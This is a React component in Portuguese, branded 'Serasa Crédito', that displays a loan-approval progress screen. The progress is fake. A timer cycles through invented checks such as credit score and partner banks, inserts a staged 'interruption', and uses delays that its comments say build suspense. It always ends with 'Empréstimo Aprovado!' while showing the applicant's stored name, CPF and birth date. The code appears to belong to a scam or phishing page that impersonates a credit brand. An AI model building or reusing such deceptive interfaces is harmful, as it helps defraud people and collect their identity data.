import { useState, useEffect } from "react";
import { FaCircleNotch } from "react-icons/fa";
import { useNavigate } from "react-router-dom";
import logo from "../assets/logo.svg";
import dayjs from "dayjs";
import { UserData } from "../types/userData";

export function CarregandoEmprestimo() {
    const [fase, setFase] = useState(0);
    const [userData, setUserData] = useState<UserData>({
        nome: "",
        cpf: "",
        dataNascimento: "",
        email: "",
        nomeMae: "",
        cep: "",
        cidade: "",
        estado: "",
        rua: "",
        numero: "",
    });
    const [erro, setErro] = useState(false); // Controle de possíveis "problemas"
    const navigate = useNavigate();

    const fases = [
        "Enviado para Análise",
        "Documentos Recebidos",
        "Verificando Dados Pessoais",
        "Consultando Histórico",
        "Analisando Score de Crédito",
        "Detectando Pendências",
        "Consultando Bancos Parceiros",
        "Houve uma Interrupção",
        "Reanalisando Dados",
        "Realizando Análise de Risco",
        "Encontramos uma Oferta Potencial",
        "Avaliando Garantias",
        "Consultando Aprovação Final",
        "Verificação Adicional Necessária",
        "Reanalisando Crédito",
        "Quase lá...",
        "Conferindo Elegibilidade",
        "Preparando Resposta",
        "Empréstimo Aprovado! 🎉"
    ];

    useEffect(() => {
        const storedUserData = localStorage.getItem("userData");
        if (storedUserData) {
            setUserData(JSON.parse(storedUserData));
        }

        const timer = setInterval(() => {
            setFase((prev) => {
                if (prev < fases.length - 1) {
                    // Simula uma "interrupção" para suspense
                    if (fases[prev + 1] === "Houve uma Interrupção") {
                        setErro(true);
                        setTimeout(() => setErro(false), 3000);
                    }
                    return prev + 1;
                } else {
                    clearInterval(timer);
                    setTimeout(() => navigate("/termosemprestimo"), 1000);
                }
                return prev;
            });
        }, getDynamicDelay(fase));

        return () => clearInterval(timer);
        // eslint-disable-next-line react-hooks/exhaustive-deps
    }, [navigate, fase]);

    const getDynamicDelay = (step: number) => {
        if (step < 5) return 2000; // Rápidas no início
        if (step < 15) return 3500; // Mais lentas no meio
        return 4500; // Tensão no final
    };

    return (
        <div className="bg-gradient-to-br from-emerald-500 to-emerald-900 min-h-screen space-y-14 p-6 text-white">
            {/* Header */}
            <header className="w-full flex justify-between items-center p-4">
                <img src={logo} alt="logo" width={120} />
                <span className="text-white font-semibold text-lg">Serasa Crédito</span>
            </header>

            {/* Main */}
            <main className="flex flex-col items-center justify-center gap-8 w-full flex-grow">
                <div className="w-full flex flex-col items-center bg-black bg-opacity-10 rounded-lg p-6 shadow-lg">
                    <FaCircleNotch
                        className={`text-white text-6xl mb-4 ${erro ? "" : "animate-spin"}`}
                        style={{ animationDuration: "1.5s" }}
                    />
                    <p className="text-2xl font-semibold text-center">
                        {erro ? "Tentando novamente..." : fases[fase]}
                    </p>

                    {/* Barra de Progresso */}
                    <div className="w-full bg-gray-300 rounded-full h-4 mt-6">
                        <div
                            className="bg-green-400 h-4 rounded-full transition-all duration-1000"
                            style={{ width: `${(fase / (fases.length - 1)) * 100}%` }}
                        ></div>
                    </div>

                    <p className="text-lg mt-4 text-zinc-300">
                        {erro
                            ? "Encontramos um problema... Não se preocupe, estamos corrigindo."
                            : "Estamos cuidando de tudo. Por favor, aguarde..."}
                    </p>
                </div>

                {/* Dados do Usuário */}
                {userData && (
                    <div className="w-full text-white p-6 rounded-lg shadow-lg bg-opacity-10 bg-gray-900">
                        <h2 className="text-2xl font-semibold mb-4">Solicitante:</h2>
                        <div className="space-y-2 text-lg">
                            <p><strong>Nome:</strong> {userData?.nome}</p>
                            <p><strong>CPF:</strong> {userData?.cpf}</p>
                            <p><strong>Data de Nascimento:</strong> {dayjs(userData?.dataNascimento).format("DD/MM/YYYY")}</p>
                        </div>
                    </div>
                )}
            </main>

            {/* Footer */}
            <footer className="w-full text-center py-4">
                <p className="text-sm">© 2024 Serasa Crédito. Todos os direitos reservados.</p>
            </footer>
        </div>
    );
}
